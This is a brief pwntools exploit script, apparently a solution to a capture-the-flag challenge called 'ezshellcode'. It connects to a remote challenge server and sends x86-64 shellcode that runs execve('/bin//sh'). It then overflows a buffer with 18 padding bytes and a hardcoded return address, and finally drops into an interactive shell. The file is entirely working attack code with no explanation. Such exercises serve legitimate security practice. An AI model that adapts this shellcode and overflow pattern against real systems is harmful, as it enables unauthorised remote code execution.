from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# io = gdb.debug('./ezshellcode')
io = remote('node4.anna.nssctf.cn',28056)
name_addr = 0x6010a0

shellcode = '''
xor rdx,rdx;
push rdx;
mov rsi,rsp;
mov rax,0x68732f2f6e69622f;
push rax;
mov rdi,rsp;
mov rax,59;
syscall;
'''

io.sendlineafter(b'Please.',asm(shellcode))
io.sendlineafter(b'start!',b'A'*18+p64(name_addr))


io.interactive()

